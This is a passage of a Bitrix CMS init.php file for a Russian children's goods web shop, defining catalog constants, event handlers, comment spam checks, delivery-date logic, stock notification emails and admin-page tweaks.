<?

    AddEventHandler('main', 'OnEpilog', array('jquery', 'loadJquery'));
    //подключение jquery в админке
    class jquery {
        function  loadJquery() {
            CModule::IncludeModule("main");
            global $APPLICATION;
            if (substr_count($APPLICATION->GetCurPage(),"/bitrix/admin/") > 0) {
                $APPLICATION->AddHeadScript('/bitrix/js/main/jquery/jquery-1.8.3.js');
            }
        }
    }



    if(preg_match("/catalog\/[0-9]+?.*?/is",$_SERVER["REQUEST_URI"]) && $_REQUEST["sef"] != "Y")
    {
        $elem = explode("?", $_SERVER["REQUEST_URI"]);
        if(isset($elem[0]) && $elem[0][strlen($elem[0])-1]!="/"){
            if(isset($elem[1]))
                $red = $elem[0]."/?".$elem[1];
            else
                $red = $elem[0]."/";
            header("Location: ".$red,TRUE,301);
        }
    }

    setlocale(LC_ALL, "ru_RU.cp1251");
    setlocale(LC_NUMERIC, "C");

    require($_SERVER["DOCUMENT_ROOT"]."/local/php_interface/include/.config.php");

    require_once($_SERVER['DOCUMENT_ROOT']."/bitrix/config/common_func.inc.php");
    require_once($_SERVER['DOCUMENT_ROOT']."/bitrix/config/CustomProperties.php");
    include_once($_SERVER['DOCUMENT_ROOT']."/bitrix/php_interface/include/skDeliveryProperty.php");

    //require($_SERVER['DOCUMENT_ROOT']."/bitrix/php_interface/include/sale_handler_guest_order.php");

    require($_SERVER["DOCUMENT_ROOT"]."/bitrix/config/individ_classes/CIUser.php");
    require($_SERVER["DOCUMENT_ROOT"]."/bitrix/php_interface/include/CSKTools.php");

    CModule::IncludeModule("iblock");

    define("GROUP_BLOG_USER_ID",76); // id пользователя блога

    define('CATALOG_IBLOCK_ID', 2); // каталог
    define('OFFERS_IBLOCK_ID', 3);  // торговый каталог
    define('REVIEWS_IBLOCK_ID', 7);  // рекомендованные списки
    define('CERTIFICATES_IBLOCK_ID', 4);  //сертификаты
    define('CERTIFICATES_PRESENT_IBLOCK_ID', 10);  //подаренные сертификаты
    define('PRODUCERS_IBLOCK_ID', 5);  // производители
    define('PRODUCERS_PROPERTY_FILTER', 53);  // свойство производителей (для фильтра)
    define('HINTS_IBLOCK_ID', 6);  // подсказки для фильтра
    define('REDIRECT_IBLOCK_ID', 23);  // редиректы
    define('WISHLIST_IBLOCK_ID', 8);  // подсказки для фильтра
    define('OUR_HELP_BLOG', 74);  // блог консультации
    define('PRESENTER_IBLOCK_ID', 11);  // награды
    define('STATUS_IBLOCK_ID', 12);  // награды
    define('QUICK_ORDER_IBLOCK_ID', 14);  // быстрый заказ
    define('NOTIFY_IBLOCK_ID', 16);  // уведомления о оставке
    define('FORUM_ID', 1);
    define("PERSON_TYPE_ID_VALUE",1); // тип плательщика физическое лицо
    define("PAY_SYSTEM_CERTIFICATE",4); // id платежной системы для сертификатов
    define("DELIVERY_ID_CERTIFICATE",2); // самовывоз

    define("CERTIFICATE_STATUS_OK",1016532); // статус сертификата принят
    define("CERTIFICATE_STATUS_BACK",1016533); // статус сертификата принят

    define('WISHLIST_TYPE', 639);  // тип события в ленте добавление в wish лист
    define('FRIEND_TYPE', 640);  // тип события в ленте добавление в друзья лист
    define('BLOG_TYPE', 638);  // тип события в ленте добавление поста
    define('ADD_COMMENT_TYPE', 642);  // тип события добавление отзыва
    define('ADD_REPORT_TYPE', 641);  // тип события запроса отзыва
    define('CERTIFICATE_TYPE', 643);  // тип события подарили сертификат

    define('CATALOG_VOTES_PROPERTY_ID', 4);           // id свойства количество голосов
    define('CATALOG_RATING_SUM_PROPERTY_ID', 5);      // id свойства сумма рейтинга
    define('CATALOG_RATING_PROPERTY_ID', 7);          // id свойтсва рейтинг
    define('PRODUCER_IBLOCK_PROPERTY_ID', 9);          // id свойства производитель

    define('CATALOG_IBLOCK_RECOMMENDETION_LIST_ID', 7);  //
    define('MY_SITE_ID', "s1");  //
    define('PAY_SYSTEM', 3);          // id банковской квитанцией

    if(!defined("isCronImport")) define("isCronImport", false);



    //игнорируемы способы доставки
    global $ignoreFriendBasketDelivery;
    $ignoreFriendBasketDelivery = array("2");

    global $ignoreFriendBasketPaySystem;
    $ignoreFriendBasketPaySystem = array("1");

    define('RECOMEND_USER_SEND',"ADVISE_FRIENDS_SEND"); // событие "рекомендовать другу"
    define('RECOMEND_LIST_SEND',"BABY_LIST_SEND"); // событие "рекомендовать другу"
    define('REPORT_REQUEST_SEND',"REPORT_REQUEST"); // событие "рекомендовать другу"

    // id значений свойства "статус" в вишлисте
    define('WISHLIST_PROPERTY_STATUS_WANT_ENUM_ID', 41);            // хочу
    define('WISHLIST_PROPERTY_STATUS_NECESSARY_ENUM_ID', 42);       // очень хочу
    define('WISHLIST_PROPERTY_STATUS_GOING_TO_DIE_ENUM_ID', 43);    // жить не могу
    define('WISHLIST_PROPERTY_STATUS_ALREADY_HAVE_ENUM_ID', 44);    // уже есть

    define('WISHLIST_PRODUCT_ID_PROPERTY_ID', 58);          // id свойства продукт
    define('WISHLIST_STATUS_PROPERTY_ID', 59);              // id свойства статус
    define('WISHLIST_USER_ID_PROPERTY_ID', 60);             // id свойства юзер


    define('BLOG_GROUP', 2);    // Группа для блогов
    define('BLOG_USER_GROUP_ALL', 1);           // id группы пользователей блогов "Все пользователи"
    define('BLOG_USER_GROUP_REG', 2);      // id группы пользователей блогов "Зарегистр. пользователи"

    define('GROUP_BLOG_OWNER_USER_ID', 76); // владелец всех групповых блогов
    define('GROUP_BLOG_OWNER_USER_ID_PERSONAL_BLOG_ID', 44); // id личного блога владельца всех групповых блогов (чтобы исключать его при выборке)






    AddEventHandler("iblock", "OnAfterIBlockElementUpdate", Array("Events", "OnAfterIBlockElementUpdateHandler"));
    AddEventHandler("iblock", "OnBeforeIBlockElementUpdate", Array("Events", "OnBeforeIBlockElementUpdateHandler"));
    AddEventHandler("iblock", "OnAfterIBlockElementAdd", Array("Events", "OnAfterIBlockElementAddHandler"));
    AddEventHandler("iblock", "OnBeforeIBlockElementAdd", Array("Events", "OnBeforeIBlockElementAddHandler"));

    AddEventHandler("socialnetwork", "OnSocNetUserRelationsUpdate", Array("Events", "OnSocNetUserRelationsUpdateHandler"));
    //AddEventHandler("catalog", "OnBeforePriceUpdate", Array("Events", "OnBeforeIBlockElementUpdateHandler"));
    AddEventHandler("sale", "OnBeforeBasketAdd", Array("Events", "OnBeforeBasketAddHandler"));
    AddEventHandler("main", "OnBeforeUserRegister", Array("Events", "OnBeforeUserRegisterHandler"));
    AddEventHandler("main", "OnBeforeUserSimpleRegister", Array("Events", "OnBeforeUserRegisterHandler"));
    AddEventHandler("main", "OnAfterUserAdd", Array("Events", "OnAfterUserAddHandler"));
    AddEventHandler("blog", "OnPostAdd", Array("Events", "OnPostAddHandler"));
    AddEventHandler("sale", "OnSalePayOrder", Array("Events", "OnSalePayOrderHandler"));
    AddEventHandler("sale", "OnSaleStatusOrder", Array("Events", "OnSaleStatusOrderHandler"));
    AddEventHandler("sale", "OnBeforeOrderUpdate", Array("Events", "OnBeforeOrderUpdateHandler"));
    AddEventHandler("main", "OnAfterUserLogout", Array("Events", "OnAfterUserLogoutHandler"));

    AddEventHandler("forum", "onAfterMessageAdd", Array("Events", "onAfterMessageAddHandler"));
    AddEventHandler("forum", "onBeforeMessageAdd", Array("Events", "onBeforeMessageAddHandler"));
    AddEventHandler("forum", "onAfterMessageDelete", Array("ForumRe", "onAfterMessageDeleteHandler"));
    AddEventHandler("forum", "onAfterTopicDelete", Array("ForumRe", "onAfterTopicDeleteHandler"));

    AddEventHandler("main", "OnBeforeEventAdd", Array("Events", "OnBeforeEventAddHandler"));
    //RegisterModuleDependences("main", "OnBeforeUserRegister", "main", "Events", "OnBeforeUserRegisterHandler");

    AddEventHandler("blog", "OnBeforePostAdd", Array("Events", "OnBeforePostAddHandler"));
    AddEventHandler("main", "OnBeforeProlog", "MyOnBeforePrologHandler", 50);

    //обновление каталога после выгрузки из 1С
    AddEventHandler("catalog", "OnSuccessCatalogImport1C", "catalogUpdate");

    //  AddEventHandler("iblock", "OnAfterIBlockElementUpdate", "processUserAvailNotify");


    //Событие формирует профиль покупателя, добавляя в него параметры, "способ доставки" и "способ оплаты"
    //AddEventHandler("sale", "OnSaleComponentOrderComplete", Array("Events", "OnSaleComponentOrderCompleteHandler"));


    function getAvailableLocationID() {   /*  возможно данная функция больше не нужна, так как есть гео модуль. закомментировано 02.07.15
        $obCache = new CPHPCache;
        if($obCache->InitCache(86400, $cache_id, "/")) { // 86400
        $arVars = $obCache->GetVars();
        $arLocationIDs = $arVars["ID"];
        } else {
        if($obCache->StartDataCache()){
        CModule::IncludeModule("iblock");

        $arLocationIDs = array(1732, 2399);
        $rsI = CIBlockElement::GetList(Array(), array("ACTIVE" => "Y", "IBLOCK_ID" =>21), array("PROPERTY_LOCATION"));
        while($arI = $rsI->GetNext())
        $arLocationIDs[] = $arI["PROPERTY_LOCATION_VALUE"];

        $obCache->EndDataCache(array(
        "ID" => $arLocationIDs
        ));
        }
        }

        return $arLocationIDs;     */
    }



    function checkForSpamMessage($strText) {

        $boolClearReview = false;

        if(!empty($_REQUEST["name"]) || !isRussian($strText))
            $boolClearReview = true;

        // удаляем во всех ссылках домен с http://  и если остались http - значит ссылка на другой сайт
        $strText = str_ireplace(array("http://mamingorodok.ru", "http://www.mamingorodok.ru"), array("", ""), $strText);
        if(stripos($strText, "http://") !== false) $boolClearReview = true;

        //    if(!$boolClearReview) { // посчитаем кол-во ссылок в посте
        //        preg_match_all("#<a.*?href=\"(.*?)\".*?/a>#", $strText, $arM);
        //        echo '<pre>'.print_r($arM, true).'</pre>';
        //        if(count($arM[0]) > 2) $boolClearReview = true;
        //    }

        if($boolClearReview)
            return false;
        else return true;

    }




    function isRussian($strText) {
        if(empty($strText))
            return true;
        elseif(
            strpos($strText, "а") !== false
            ||
            strpos($strText, "о") !== false
            ||
            strpos($strText, "е") !== false
            ||
            strpos($strText, "и") !== false
        ) return true;

        else return false;
    }



    function showNoindex($isStart = true, $showAnyway = false)
    {
        if($_SERVER["SCRIPT_NAME"] != '/index.php' || $showAnyway)
            return '<!--'.($isStart?'':'/').'noindex-->';
    }

    function showNI($isStart = true)
    {
        return '<!--'.($isStart?'':'/').'noindex-->';
    }

    if(!function_exists('getFileDir')) //Получение файлов из директории
    {
        function getFileDir($dir)
        {
            if(!empty($dir))
            {
                if(is_dir($dir))
                {
                    $files = scandir($dir);
                    array_shift($files);
                    array_shift($files);

                    return $files;
                }
            }
            return array();
        }
    }

    function getFreeEmail($email)
    {
        if(empty($email))
            $email = 'fake_'.randString(10).'@mamingorodok.ru';

        $arFilter = Array("EMAIL" => $email);
        $rsUsers = CUser::GetList(($by = "ID"), ($order = "ASC"), $arFilter);
        while($arUser = $rsUsers->Fetch())
            return getFreeEmail('');

        return $email;
    }




    AddEventHandler("main", "OnEndBufferContent", "ChangeMyContent");
    function ChangeMyContent(&$content)
    {
        if(
            strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/sale_order_detail.php") === 0
            ||
            strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/sale_order_new.php") === 0
        ) {
            CModule::IncludeModule("iblock");

            if(preg_match('#<input type="text" maxlength="250" size="30" value="noemail@mamingorodok.ru" name="ORDER_PROP_5" id="ORDER_PROP_5" >#', $content, $arM) || preg_match('#<input type="text" maxlength="250" size="30" value="" name="ORDER_PROP_5" id="ORDER_PROP_5" >#', $content, $arM)) {
                $strFreeEmail = getFreeEmail('');
                $strReplace = '<input type="text" maxlength="250" size="30" value="'.$strFreeEmail.'" name="ORDER_PROP_5" id="ORDER_PROP_5" >';

                $content = str_replace($arM[0], $strReplace, $content);
            }

            // замена textarea на select при отмене заказа
            if(strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/sale_order_detail.php") === 0) {
                preg_match('#<textarea.*?id="FORM_REASON_CANCELED".*?>(.*?)</textarea>#', $content, $arM);
                $strControlName = 'FORM_REASON_CANCELED';
            } elseif(strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/sale_order_new.php") === 0) {
                preg_match('#<textarea name="REASON_CANCELED".*?>(.*?)</textarea>#', $content, $arM);
                $strControlName = 'REASON_CANCELED';
            }

            $strSelect = '<select name="'.$strControlName.'" id="FORM_REASON_CANCELED">';
            $rsI = CIBlockElement::GetList(Array("SORT" => "ASC"), array("ACTIVE" => "Y", "IBLOCK_ID" => 22), false, false, array("NAME"));
            while($arI = $rsI->GetNext())
                $strSelect .= '<option'.($arI["NAME"]==$arM[1]?' selected="selected"':'').'>'.$arI["NAME"].'</option>';

            $strSelect .= '</select>';

            $content = str_replace($arM[0], $strSelect, $content);
        }

        if(strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/sale_order_edit.php") === 0)
        {
            preg_match('/<input.*?value="(.*?)" name="ORDER_PROP_11">/', $content, $arM);
            if(strlen($arM[0])>0)
            {
                preg_match("/\[(\d+)\]/", $arM[1], $arMID);
                $intManagerID = intval($arMID[1]);


                // get managers
                $strSelect = '';
                $rsUsers = CUser::GetList(($by="last_name"), ($order="desc"), array("GROUPS_ID" => array(7), "ACTIVE"=>"Y"), array("SELECT"=>array("ID", "LAST_NAME", "NAME", "LOGIN")));
                while($arUser = $rsUsers -> Fetch())
                {
                    $strName = $arUser["LAST_NAME"];
                    if(strlen($strName)>0) $strName .= ' ';
                    $strName .= $arUser["NAME"].' ['.$arUser["ID"].']';

                    $strSelect .= '<option'.($intManagerID==$arUser["ID"]?' selected="selected"':'').'>'.$strName.'</option>';
                }
                $strSelect = '<select name="ORDER_PROP_11"><option value="">Выберите менеджера</option>'.$strSelect.'</select>';

                $content = str_replace($arM[0], $strSelect, $content);
            }
        }
    }


    function updateActionItemData($intID)
    {
        $rs = CIBlockElement::GetList(Array(), array("ID"=>$intID, "IBLOCK_ID"=>18));
        if($ob = $rs -> GetNextElement())
        {
            $ar = $ob -> GetFields();
            $ar["PROPERTIES"] = $ob -> GetProperties();

            $arItems = array();
            $arItemsExclude = array();

            if(count($ar["PROPERTIES"]["ITEM"]["VALUE"])>0 && is_array($ar["PROPERTIES"]["ITEM"]["VALUE"]))
                $arItems = array_merge($arItems, $ar["PROPERTIES"]["ITEM"]["VALUE"]);

            if(count($ar["PROPERTIES"]["GITEM"]["VALUE"])>0 && is_array($ar["PROPERTIES"]["GITEM"]["VALUE"]))
            {
                $rsGItem = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>2, "SECTION_ID"=>$ar["PROPERTIES"]["GITEM"]["VALUE"], "INCLUDE_SUBSECTIONS"=>"Y"), false, false, array("ID"));
                while($arGItem = $rsGItem -> GetNext())
                    $arItems[] = $arGItem["ID"];
            }

            if(count($ar["PROPERTIES"]["ITEM_EXCLUDE"]["VALUE"])>0 && is_array($ar["PROPERTIES"]["ITEM_EXCLUDE"]["VALUE"]))
                $arItemsExclude = array_merge($arItemsExclude, $ar["PROPERTIES"]["ITEM_EXCLUDE"]["VALUE"]);

            if(count($ar["PROPERTIES"]["GITEM_EXCLUDE"]["VALUE"])>0 && is_array($ar["PROPERTIES"]["GITEM_EXCLUDE"]["VALUE"]))
            {
                $rsGItem = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>2, "SECTION_ID"=>$ar["PROPERTIES"]["GITEM_EXCLUDE"]["VALUE"], "INCLUDE_SUBSECTIONS"=>"Y"), false, false, array("ID"));
                while($arGItem = $rsGItem -> GetNext())
                    $arItemsExclude[] = $arGItem["ID"];
            }

            if($intID == 34448)
            {
                echo "скрипт остановлен в init.php при апдейте элемента 34448 // if($intID == 34448) die();";
                die($intID);
            }

            CIBlockElement::SetPropertyValues($intID, 18, '#'.implode("#", array_diff($arItems, $arItemsExclude))."#", "ITEMS");
        }
    }

    function prepareMultilineText($str)
    {
        $str = normalizeBR($str);
        if(strpos($str, "<br>") !== false) $str = '&mdash;&nbsp;'.str_replace("<br>", "<br>&mdash;&nbsp;", $str);
        return $str;
    }

    function normalizeBR($strSrc)
    {
        $str = str_replace(array("</br>", "<BR>", "<br />", "<br/>"), array("<br>", "<br>", "<br>", "<br>"), trim($strSrc));
        $str = str_replace(array("<br><br>"), array("<br>"), trim($str));
        if(substr($str, -4) == "<br>") $str = substr($str, 0, strlen($str)-4);
        return $str;
    }

    function processUserAvailNotify(&$arResult)
    {
        CModule::IncludeModule("iblock");

        $el = new CIBlockElement;

        // offers
        $arResult = array();

        $rsA = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>NOTIFY_IBLOCK_ID, "ACTIVE"=>"Y", "!PROPERTY_OFFER"=>false), false, false, array("ID", "PROPERTY_OFFER", "XML_ID", "NAME"));
        while($arA = $rsA -> Fetch())
            $arResult[$arA["PROPERTY_OFFER_VALUE"]][$arA["ID"]] = $arA;

        if(count($arResult)>0)
        {
            $el = new CIBlockElement;

            $rsO = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>OFFERS_IBLOCK_ID, "ACTIVE"=>"Y", "ID"=>array_keys($arResult)), false, false, array("ID", "CATALOG_GROUP_1", "PROPERTY_CML2_LINK.DETAIL_PAGE_URL", "PROPERTY_CML2_LINK.NAME"));
            while($arO = $rsO -> GetNext())
            {
                if($arO["CATALOG_QUANTITY"]>0 && $arO["CATALOG_PRICE_1"]>0)
                {
                    $arSend = array(
                        "PRICE" => CurrencyFormat($arO["CATALOG_PRICE_1"], $arO["CATALOG_CURRENCY_1"]),
                        "LINK" => "http://www.mamingorodok.ru".str_replace("//", "/", $arO["PROPERTY_CML2_LINK_DETAIL_PAGE_URL"]).'?offerID='.$arO["ID"],
                        "PRODUCT" => $arO["PROPERTY_CML2_LINK_NAME"],
                    );

                    foreach($arResult[$arO["ID"]] as $intNotifyID => $arUserData)
                    {
                        $arSend["EMAIL"] = $arUserData["XML_ID"];
                        $arSend["USER_NAME"] = $arUserData["NAME"];
                        $arSend["USER_PHONE"] = $arUserData["CODE"];
                        CEvent::Send("AVAIL_NOTIFY", "s1", $arSend);
                        $el->Update($intNotifyID, array("ACTIVE"=>"N"));
                    }
                }
            }
        }

        global $USER;
        // products
        $arResult = array();
        $arPrice = array();
        $rsA = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>NOTIFY_IBLOCK_ID, "ACTIVE"=>"Y", "CREATED_BY" => $USER -> GetID(), "!PROPERTY_PRODUCT"=>false), false, false, array("ID", "PROPERTY_PRODUCT", "XML_ID", "NAME", "CODE"));
        while($arA = $rsA -> Fetch())
        {
            // arshow($arA);
            //  if(in_array($arA["PROPERTY_PRODUCT_PROPERTY_CH_SNYATO_ENUM_ID"]))
            $arResult[$arA["ID"]] = array("EMAIL" => $arA["XML_ID"], "PRODUCT"=>$arA["PROPERTY_PRODUCT_VALUE"], "USER_NAME" => $arA["NAME"], "USER_PHONE" => $arA["CODE"]);

            if(!isset($arPrice[$arA["ID"]]))
            {

                $rsP = CIBlockElement::GetList(Array("CATALOG_PRICE_3"=>"ASC"), array("IBLOCK_ID"=>OFFERS_IBLOCK_ID, "ACTIVE"=>"Y", "PROPERTY_CML2_LINK"=>$arA["PROPERTY_PRODUCT_VALUE"]), false, false, array("ID", "CATALOG_GROUP_2", "PROPERTY_CML2_LINK.DETAIL_PAGE_URL", "PROPERTY_CML2_LINK.NAME"));
                if ($rsP->SelectedRowsCount() > 0) {
                    while($arP = $rsP -> GetNext())
                    {

                        if($arP["CATALOG_QUANTITY"]>0)
                        {
                            $arPrice[$arA["PROPERTY_PRODUCT_VALUE"]] = $arP;
                            break;
                        }
                    }
                }
                else {
                    $rsB = CIBlockElement::GetList(Array(), array("ACTIVE"=>"Y", "ID"=>$arA["PROPERTY_PRODUCT_VALUE"]), false, false, array("ID", "CATALOG_GROUP_3", "NAME")) -> Fetch();

                    if ($rsB["CATALOG_QUANTITY"]>0) {
                        $arPrice[$arA["PROPERTY_PRODUCT_VALUE"]]=$rsB;
                    }
            }}
        }
        // arshow($arResult);
        if(count($arPrice)>0)
        {
            //arshow($arPrice);
            foreach($arResult as $intID => $arData)
            {
                if(isset($arPrice[$arData["PRODUCT"]]))
                {
                    $arSend = array(
                        "PRICE" => CurrencyFormat($arPrice[$arData["PRODUCT"]]["CATALOG_PRICE_3"], $arPrice[$arData["PRODUCT"]]["CATALOG_CURRENCY_1"]),
                        "LINK" => "http://www.mamingorodok.ru".str_replace("//", "/", $arPrice[$arData["PRODUCT"]]["PROPERTY_CML2_LINK_DETAIL_PAGE_URL"]).'?offerID='.$arPrice[$arData["PRODUCT"]]["ID"],
                        "EMAIL" => $arData["EMAIL"],
                        //"PRODUCT" => $arPrice[$arData["PRODUCT"]]["PROPERTY_CML2_LINK_NAME"],
                        "PRODUCT" => $arPrice[$arData["PRODUCT"]]["NAME"],
                        "USER_NAME" => $arData["USER_NAME"],
                        "USER_PHONE" => $arData["USER_PHONE"]
                    );
                    CEvent::Send("AVAIL_NOTIFY", "s1", $arSend);
                    CEvent::Send("NOTIFY_PRODUCT", "s1", $arSend);
                    $el->Update($intID, array("ACTIVE"=>"N"));
                }
            }
        }
    }
    function getAvailText($intCnt)
    {
        if($intCnt>3)
            return 'В наличии';
        elseif($intCnt>0)
            return 'Мало, уточняйте наличие';
        else return "Нет в наличии";
    }

    function isWeekendORHoliday($unixDate)
    {
        if(CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>15, "ACTIVE"=>"Y", "DATE_ACTIVE_FROM"=>date("d.m.Y", $unixDate), "!PROPERTY_WORKDAY"=>false), array())>0)
            return false;
        elseif(date("w", $unixDate) == 6 || date("w", $unixDate) == 0)
            return true;
        elseif(CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>15, "ACTIVE"=>"Y", "DATE_ACTIVE_FROM"=>date("d.m.Y", $unixDate)), array())>0)
            return true;
        else return false;
    }

    function getFirstWorkDay($unixDate)
    {
        for($i=1; $i<20;$i++) // дольше выходных у нас не бывает )
        {
            $currDate = $unixDate+$i * 86400;
            if(!isWeekendORHoliday($currDate))
                return $currDate;
        }

        return $currDate;
    }

    function getDeliveryDates($intCnt=3, $unixToday=false)
    {
        $arResult = array();

        if(!$unixToday)
        {
            $unixToday =  mktime(0,0,0,date("m"), date("d"), date("Y"));
            $intHours = date("H");
        } else {
            $intHours = date("H", $unixToday);
            $unixToday =  mktime(0,0,1,date("m", $unixToday), date("d", $unixToday), date("Y", $unixToday));
        }

        $intDate = $unixToday;
        for($i=0;$i<$intCnt;$i++)
        {
            $intDate = getDeliveryDate(true, $intDate);

            $arResult[date("d.m.Y", $intDate)] = CIBlockFormatProperties::DateFormat("j F", $intDate);
        }

        return $arResult;
    }

    function getDeliveryDate($boolReturnUnix = false, $unixToday=false)
    {
        CModule::IncludeModule("iblock");

        if(!$unixToday)
        {
            $unixToday =  mktime(0,0,0,date("m"), date("d"), date("Y"));
            $intHours = date("H");
        } else {
            $intHours = date("H", $unixToday);
            $unixToday =  mktime(0,0,1,date("m", $unixToday), date("d", $unixToday), date("Y", $unixToday));
        }

        $calculatedDate = 0;
        if(isWeekendORHoliday($unixToday)) // выходные
            $calculatedDate = getFirstWorkDay($unixToday);
        elseif(isWeekendORHoliday($unixToday + 86400)) {// в пятницу (или в предпраздничный день)
            if($intHours>=0 && $intHours<16)
                $calculatedDate = getFirstWorkDay($unixToday + 86400);
            else $calculatedDate = getFirstWorkDay($unixToday);
        } else {
            if($intHours>=0 && $intHours<19) // обычный день
                $calculatedDate = $unixToday + 86400;
            else $calculatedDate = $unixToday + 86400 * 2;
        }

        if($boolReturnUnix)
            return $calculatedDate;
        else return CIBlockFormatProperties::DateFormat("j F", $calculatedDate);
    }

    function sklonenie($n, $forms)
    {
        return $n%10==1&&$n%100!=11?$forms[0]:($n%10>=2&&$n%10<=4&&($n%100<10||$n%100>=20)?$forms[1]:$forms[2]);
    }

    function getEnd($intCnt, $strType = 'товар')
    {
        if($strType == 'товар')
            $arForms = array('товар', 'товара', 'товаров');
        elseif($strType == "отзыв")
            $arForms =  array('отзыв', 'отзыва', 'отзывов');
        elseif($strType == "размер")
            $arForms =  array('размер', 'размера', 'размеров');
        elseif($strType == "цвет")
            $arForms =  array('цвет', 'цвета', 'цветов');
        return sklonenie($intCnt, $arForms) ;
    }

    function smart_trim($text, $max_len, $trim_middle = false, $trim_chars = '...', $boolReturnRest = false)
    { // smartly trims text to desired length
        $text = trim($text);

        if (strlen(strip_tags($text)) < $max_len) {

            if(!$boolReturnRest)
                return strip_tags($text);
            else return array("PREVIEW" => strip_tags($text));

        } elseif ($trim_middle) {

            $hasSpace = strpos($text, ' ');
            if (!$hasSpace) {
                $first_half = substr($text, 0, $max_len / 2);
                $last_half = substr($text, -($max_len - strlen($first_half)));
            } else {
                $last_half = substr($text, -($max_len / 2));
                $last_half = trim($last_half);
                $last_space = strrpos($last_half, ' ');
                if (!($last_space === false)) {
                    $last_half = substr($last_half, $last_space + 1);
                }
                $first_half = substr($text, 0, $max_len - strlen($last_half));
                $first_half = trim($first_half);
                if (substr($text, $max_len - strlen($last_half), 1) == ' ') {
                    $first_space = $max_len - strlen($last_half);
                } else {
                    $first_space = strrpos($first_half, ' ');
                }
                if (!($first_space === false)) {
                    $first_half = substr($text, 0, $first_space);
                }
            }

            return $first_half.$trim_chars.$last_half;

        } else {

            $trimmed_text = strip_tags($text);
            $trimmed_text = substr($text, 0, $max_len);
            $trimmed_text = trim($trimmed_text);
            if (substr($text, $max_len, 1) == ' ') {
                $last_space = $max_len;
            } else {
                $last_space = strrpos($trimmed_text, ' ');
            }
            if (!($last_space === false)) {
                $trimmed_text = substr($trimmed_text, 0, $last_space);
            }
            if(!$boolReturnRest)
                return $trimmed_text.'<span class="dots">'.$trim_chars.'</span>';
            else return array("PREVIEW" => $trimmed_text.'<span class="dots">'.$trim_chars.'</span>', "REST" => str_replace($trimmed_text, "", $text));
        }
    }

    AddEventHandler("main", "OnEpilog", "process404");

    function inc404()
    {
        @define("ERROR_404", "Y");
    }

    function process404()
    {
        global $USER;
        if(
            !defined('ADMIN_SECTION') &&
            defined("ERROR_404")
        )
        {
            global $APPLICATION;
            $APPLICATION->RestartBuffer();
            CHTTP::SetStatus("404 Not Found");

            include($_SERVER["DOCUMENT_ROOT"].SITE_TEMPLATE_PATH."/header.php");
            require($_SERVER['DOCUMENT_ROOT'].'/404.php');
            include($_SERVER["DOCUMENT_ROOT"].SITE_TEMPLATE_PATH."/footer.php");

        }
    }

    function MyOnBeforePrologHandler()
    {
        global $APPLICATION, $USER;

        if(!isset($_SESSION["HOST_FROM"]) && !empty($_SERVER["HTTP_REFERER"])) {
            $strReferer = $_SERVER["HTTP_REFERER"];
            $arUrl = parse_url($strReferer);

            if($arUrl["host"] != 'www.mamingorodok.ru') {
                $_SESSION["HOST_FROM"] = $arUrl["host"];
            } else $_SESSION["HOST_FROM"] = '';
        }

        if(strpos($_SERVER['REQUEST_URI'], "/bitrix/admin/") === 0) {
            $APPLICATION->AddHeadString('<link rel="stylesheet" type="text/css" href="/bitrix/skaux/css/admin.css">');
        }

        if(strpos($APPLICATION -> GetCurDir(), "/bitrix/") === false) {
            if(isset($_REQUEST["comment"])) {
                if(!checkForSpamMessage($_REQUEST["comment"])) {
                    unset($_REQUEST["comment"]);
                    unset($_POST["comment"]);
                }
            }

            // skRedirect::checkRedirect($_SERVER["REQUEST_URI"]);

            // старницы без параметров и без слэша на конце
            $arPath = parse_url($_SERVER['REQUEST_URI']);
            if(!preg_match("/\.[a-z0-9]{2,3}/", $arPath["path"]))
                if(substr($arPath["path"], -1) != '/') inc404();

                if(strpos($APPLICATION->GetCurDir(), "/catalog/") === 0)
            { // в каталоге не может быть более 3 составляющих в url
                $arTmp = explode("/", $APPLICATION->GetCurDir());
                // if(count($arTmp)>5) inc404();
            }
        }
        // redirect old numeric url
        /*if(preg_match("/\/catalog\/(\d+)\/(\d+)\//i", $APPLICATION->GetCurDir(), $arM))
        {
        CModule::IncludeModule("iblock");
        $strPath = '/catalog/';
        if($arM[1]>0)
        {
        $rsS = CIBlockSection::GetList(Array(), array("IBLOCK_ID"=>CATALOG_IBLOCK_ID, "ID"=>$arM[1], "ACTIVE"=>"Y"), false);
        if($arS = $rsS -> GetNext())
        {
        $strPath .= $arS["CODE"].'/';
        if($arM[2]>0)
        {
        $rsI = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>CATALOG_IBLOCK_ID, "ID"=>$arM[2], "ACTIVE"=>"Y"), false, false, array("CODE"));
        if($arI = $rsI -> GetNext())
        $strPath .= $arI["CODE"].'/';

        LocalRedirect($strPath, true, "301 Moved permanently");
        } else {
        inc404();
        }
        } else {
        inc404();
        }
        }
        } elseif(preg_match("/\/catalog\/(\d+)\//i", $APPLICATION->GetCurDir(), $arM)) {
        CModule::IncludeModule("iblock");
        $strPath = '/catalog/';
        $rsS = CIBlockSection::GetList(Array(), array("IBLOCK_ID"=>CATALOG_IBLOCK_ID, "ID"=>$arM[1], "ACTIVE"=>"Y"), false);
        if($arS = $rsS -> GetNext())
        {
        $strPath .= $arS["CODE"].'/';
        LocalRedirect($strPath, true, "301 Moved permanently");
        } else {
        require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
        require($_SERVER['DOCUMENT_ROOT'].'/404.php');
        exit();
        }
        }*/

        if($_REQUEST["sef"] == "Y")
        {
            $APPLICATION -> SetCurPage($_SERVER["REDIRECT_URL"], $_SERVER["QUERY_STRING"]);
            if(strlen($_REQUEST["producerCode"])>0)
            {
                CModule::IncludeModule("iblock");
                $rsP = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>5, "CODE"=>$_REQUEST["producerCode"]), false, false, array("ID", "NAME", "CODE", "PROPERTY_NAME_RUS"));
                if($arP = $rsP -> GetNext())
                {
                    $_REQUEST["set_filter"] = 'Y';
                    $_REQUEST["arrLeftFilter_pf"]["CH_PRODUCER"][] = $arP["ID"];
